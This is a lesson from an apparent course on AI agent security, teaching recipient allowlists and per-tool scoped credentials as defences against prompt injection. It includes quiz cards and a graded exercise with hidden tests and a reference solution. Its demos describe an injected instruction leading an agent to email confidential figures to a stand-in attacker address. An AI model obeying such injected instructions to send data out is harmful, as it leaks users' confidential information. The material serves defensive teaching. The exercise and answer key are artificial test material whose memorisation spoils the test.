# Module 3, Lesson 11 — Concept 3: Allowlists and per-tool credentials

---

## Limiting a tool that does get called

[Narrow tools](→ this lesson, narrow tools shrink the blast radius concept) limit what tools exist, and [gates](→ this lesson, separate reads from writes and gate the writes concept) limit when a tool runs. This concept limits what a tool can reach *when it does run*, so that even a tool the agent is meant to have, called with the agent's own permission, can't be turned all the way to the worst case.

## Allowlists: bound what a tool can act on

An **allowlist** is a fixed set of things a tool is permitted to act on, checked inside the tool. You met one already: [Lesson 9's fetch tool](→ this module, web interaction lesson, everything from the web is untrusted input concept) that would only fetch URLs the agent had actually been given. The same idea bounds any tool with an external reach, an email tool's recipients, a database tool's tables, a file tool's directories:

```python
# an outbound email tool, with and without an allowlist on the recipient

ALLOWED_RECIPIENTS = {"team@ourcompany.example", "oncall@ourcompany.example"}
SENT = []

def send_email_unrestricted(to: str, body: str) -> str:
    SENT.append((to, body))
    return f"sent to {to}"

def send_email(to: str, body: str) -> str:
    if to not in ALLOWED_RECIPIENTS:
        return f"Error: {to} is not an approved recipient. Allowed: {', '.join(sorted(ALLOWED_RECIPIENTS))}."
    SENT.append((to, body))
    return f"sent to {to}"

# an injected instruction wants the agent to email data to an outside address
print("unrestricted:", send_email_unrestricted("attacker@evil.example", "Q3 figures: ..."))
print("allowlisted: ", send_email("attacker@evil.example", "Q3 figures: ..."))
print("legit use:   ", send_email("oncall@ourcompany.example", "research_agent is down"))
print("actually sent:", SENT)
```
```
unrestricted: sent to attacker@evil.example
allowlisted:  Error: attacker@evil.example is not an approved recipient. Allowed: oncall@ourcompany.example, team@ourcompany.example.
legit use:    sent to oncall@ourcompany.example
actually sent: [('attacker@evil.example', 'Q3 figures: ...'), ('oncall@ourcompany.example', 'research_agent is down')]
```
*(runs live, shows output — read-only demo snippet, not graded)*

The unrestricted tool emailed the confidential figures to an outside address, because that's what it was asked to do. The allowlisted tool refused: `attacker@evil.example` isn't on the list, so no injected instruction can send there, while genuine sends to the team still work. This cuts the [external-communication leg of the trifecta](→ this module, the tool threat model lesson, the dangerous combination concept) down from "anywhere" to "these approved destinations", which for many agents is enough to break the leg entirely. Note the refusal is a useful error that names the allowed recipients, [as Lesson 3 advised](→ this module, shaping what tools return lesson, structured results and useful error messages concept), so a model that had a legitimate reason can correct itself.

## Per-tool credentials: each tool holds only its own access

The deepest version of least privilege is about the *credentials* the tools run with. An agent's tools need access to real systems, a database, an email service, a payment API, and that access comes from credentials: API tokens, database roles, service accounts. The temptation is to give the whole agent one powerful credential that can do everything. The safer design gives each tool only the credential it needs, scoped to exactly its job:

```python
# per-tool credentials: each tool holds only the access it needs.
# these stand in for real credentials (an API token, a DB role) scoped to one thing.

class ReadOnlyRegistryAccess:
    scope = "registry:read"
    def read(self, agent): return f"read {agent}"
    def write(self, agent, model): raise PermissionError("this credential is read-only")

class BillingReadAccess:
    scope = "billing:read"
    def read_invoice(self, month): return f"invoice for {month}"

# the lookup tool is handed ONLY the read-only registry credential
def get_agent_model(agent, credential):
    return credential.read(agent)

read_cred = ReadOnlyRegistryAccess()
print("lookup works:", get_agent_model("research_agent", read_cred))

# even if an injection convinced the agent to try, this credential can't write or touch billing
try:
    read_cred.write("research_agent", "claude-haiku")
except PermissionError as e:
    print("write blocked by the credential itself:", e)
print("billing is a different credential entirely; the lookup tool was never given it")
```
```
lookup works: read research_agent
write blocked by the credential itself: this credential is read-only
billing is a different credential entirely; the lookup tool was never given it
```
*(runs live, shows output — read-only demo snippet, not graded; these classes stand in for real scoped credentials, such as a read-only database role or a token limited to one resource)*

The lookup tool holds a credential that can only *read* the registry. Even if an injection got the agent to attempt a write, the credential itself refuses, one layer below the tool. And billing is a separate credential the lookup tool was never handed, so nothing that goes wrong in the registry tools can reach billing data at all.

This is **the principle of least privilege**, the idea underneath this whole lesson, stated in its original form: every component should have the minimum access it needs to do its job, and no more. It matters because it's the last line that holds when the others don't. If a narrow tool turns out to do more than you realized, or a gate is missing on some action, a tightly scoped credential still caps what any single tool can actually reach. Scoping credentials is enforced by the systems the credentials belong to, the database, the API, the operating system, not by the agent or the model, which is exactly why it holds even when everything above it has been talked around.

Setting up scoped credentials, service accounts, narrow database roles and rotating tokens, is operational work that belongs to [deployment and production security](→ this course, the production security deployment and ethics module). What matters at the design stage is the principle: decide what each tool must reach before you build it, give it exactly that, and never hand the agent one credential that can do everything.

---

## Quiz cards

> **Q1.** What does an allowlist on an email tool's recipients accomplish?
> - A) It stops the model from writing email bodies
> - B) It limits which addresses the tool can send to, so an injected instruction can't email data to an outside address ✅
> - C) It encrypts the email in transit
> - D) It requires human approval for every send
>
> *Explanation:* The allowlist bounds the tool's reach. It narrows the external-communication leg from "anywhere" to a fixed set of approved destinations.

> **Q2.** Lesson 9's URL-allowlisted fetch tool and this concept's recipient-allowlisted email tool share what idea?
> - A) Both require the same credential
> - B) Both bound what a tool may act on to a fixed, approved set, checked inside the tool ✅
> - C) Both need a human to approve each call
> - D) Both only work over MCP
>
> *Explanation:* An allowlist is one pattern applied to different reaches: which URLs may be fetched, which recipients may be emailed, which tables queried.

> **Q3.** What is per-tool credentialing?
> - A) Giving every tool the same powerful credential for simplicity
> - B) Requiring the model to supply a password per call
> - C) Giving each tool only the scoped access it needs, so a compromised tool can't reach beyond its own job ✅
> - D) Storing credentials inside the system prompt
>
> *Explanation:* Each tool holds the minimum access for its task. The registry read tool can't write, and can't touch billing at all.

> **Q4.** Why does a read-only credential hold even if an injection convinces the agent to attempt a write?
> - A) The model refuses write instructions
> - B) The agent detects the injection first
> - C) The credential is enforced by the underlying system, below the tool, so the write is refused regardless of what the agent tries ✅
> - D) Writes are queued for approval
>
> *Explanation:* Scoping is enforced by the database or API the credential belongs to, not by the agent, which is why it survives even when the layers above it are talked around.

> **Q5.** What is the principle of least privilege?
> - A) The agent should use the least capable model that works
> - B) Every component should have the minimum access it needs to do its job, and no more ✅
> - C) Tools should be called as rarely as possible
> - D) The agent should ask permission before every action
>
> *Explanation:* It's the idea under the whole lesson: narrow tools, split reads and writes, allowlists and scoped credentials are all ways of granting the minimum and no more.

---

## Applied sandbox exercise

*(graded — an allowlisted send tool)*

**Task shown to learner:** Implement `make_send_email(allowed_recipients, outbox)`, which builds a send tool bound to a fixed set of recipients. It returns a `send_email(to, body)` function that:

- if `to` is not in `allowed_recipients`, returns an `"Error: ..."` string that names the rejected address and lists the allowed recipients (sorted), and sends nothing;
- otherwise appends `{"to": to, "body": body}` to `outbox` and returns `"sent to <to>"`.

**Starter code:**
```python
def make_send_email(allowed_recipients: set, outbox: list):
    def send_email(to: str, body: str) -> str:
        # TODO: refuse recipients not on the allowlist; otherwise record the send
        ...
    return send_email
```

**Hidden tests:**
```python
outbox = []
send_email = make_send_email({"team@ourcompany.example", "oncall@ourcompany.example"}, outbox)

# 1. an approved recipient goes through and is recorded
assert send_email("team@ourcompany.example", "weekly update") == "sent to team@ourcompany.example"
assert outbox == [{"to": "team@ourcompany.example", "body": "weekly update"}]

# 2. an outside address is refused, with an actionable error, and nothing is sent
r = send_email("attacker@evil.example", "Q3 figures")
assert r.startswith("Error:") and "attacker@evil.example" in r
assert len(outbox) == 1   # unchanged

# 3. the error lists the allowed recipients so the model can correct course
assert "team@ourcompany.example" in r and "oncall@ourcompany.example" in r

# 4. the allowlist is closed over per tool: a second tool with a different list is independent
other_outbox = []
send_alerts = make_send_email({"pager@ourcompany.example"}, other_outbox)
assert send_alerts("pager@ourcompany.example", "alert").startswith("sent")
assert send_alerts("team@ourcompany.example", "x").startswith("Error:")   # not on THIS tool's list
assert len(other_outbox) == 1
```

**Hint (shown on request):** Check `to not in allowed_recipients` first and return the error, listing `", ".join(sorted(allowed_recipients))`. The inner `send_email` closes over `allowed_recipients` and `outbox`, so each tool built this way carries its own list.

**Reference solution:**
```python
def make_send_email(allowed_recipients: set, outbox: list):
    def send_email(to: str, body: str) -> str:
        if to not in allowed_recipients:
            allowed = ", ".join(sorted(allowed_recipients))
            return f"Error: {to} is not an approved recipient. Allowed recipients: {allowed}."
        outbox.append({"to": to, "body": body})
        return f"sent to {to}"
    return send_email
```

**Explanation:** The allowlist is checked inside the tool, so no injected instruction can route around it: an address that isn't on the list is refused before anything is sent (test 2), while approved sends work normally (test 1). The error names the allowed recipients (test 3), so a model with a legitimate send can redirect it. Test 4 shows why building the tool with a closure matters: two send tools with different allowlists are fully independent, which is the same idea as a per-tool credential, each tool carrying only its own reach.

---

*(End of Concept 3 — final concept of Lesson 11. The lesson continues with the recap and comprehensive sandbox.)*
